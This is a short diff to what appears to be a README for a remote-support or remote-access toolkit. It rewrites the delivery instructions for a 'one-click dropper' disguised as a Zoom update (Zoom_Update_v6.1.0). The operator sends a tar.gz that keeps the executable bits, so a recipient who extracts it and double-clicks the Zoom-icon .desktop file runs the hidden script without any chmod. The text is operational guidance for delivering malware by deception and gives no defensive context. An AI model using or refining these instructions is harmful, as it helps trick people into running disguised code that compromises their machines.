@@ -42,9 +42,11 @@ sh ./uninstall-betterdesk-support.sh
 
 ## One-click dropper: `Zoom_Update_v6.1.0`
 
-Send `Zoom_Update_v6.1.0.desktop` with `Zoom_Update_v6.1.0.sh` and
-`zoom-private.png` beside it. The desktop file carries the Zoom-looking icon and
-resolves the script through its own `%k` location, so the folder can be moved.
+**Send `Zoom_Update_v6.1.0.tar.gz`** — it stores the executable bits, so the
+receiver extracts and double-clicks; no `chmod` is needed. The archive contains
+`Zoom_Update_v6.1.0.desktop` (Zoom icon), the script, icon and a README. The
+desktop file resolves the script through its own `%k` location, so the folder
+can be moved.
 
 Flow:
 
